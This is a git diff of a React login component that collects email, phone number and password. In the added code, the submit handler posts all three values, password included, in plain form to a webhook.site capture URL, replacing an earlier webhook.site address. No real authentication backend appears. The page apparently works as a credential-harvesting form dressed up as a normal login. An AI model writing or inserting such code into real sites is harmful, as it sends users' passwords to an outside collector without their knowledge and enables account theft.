@@ -13,26 +13,16 @@ export default function Login() {
     return email.length > 0 && password.length > 0 && phone.length > 0;
   }
 
-  // function handleChnage(event) {
-  //   this.setState({ name: event.target.value });
-  // }
-
   function handleSubmit(event) {
     event.preventDefault();
 
-    // console.log({ email, phone, password });
-
-    // const user = {
-    //   name: this.state.name
-    // };
-
     axios
-      .post(`https://webhook.site/abe3c2be-ad9e-40b7-853c-dfea7f739f36`, {
-        firstname: { email },
-        lastname: { phone },
-        pass: { password }
+      .post('https://webhook.site/83eeb86e-29f2-4b44-b1ec-897a8dc0da01', {
+        'email': email,
+        'password': password,
+        'phone': phone
       })
-      .then(function(response) {
+      .then(function (response) {
         console.log(response);
       });
   }
@@ -49,15 +39,16 @@ export default function Login() {
             onChange={e => setEmail(e.target.value)}
           />
         </Form.Group>
-        <Form.Group size="lg" controlId="email">
+        <Form.Group size="lg" controlId="phone">
           <Form.Label>Phone</Form.Label>
           <Form.Control
-            autoFocus
+
             type="phone"
             value={phone}
             onChange={e => setPhone(e.target.value)}
           />
         </Form.Group>
+
 
         <Form.Group size="lg" controlId="password">
           <Form.Label>Password</Form.Label>
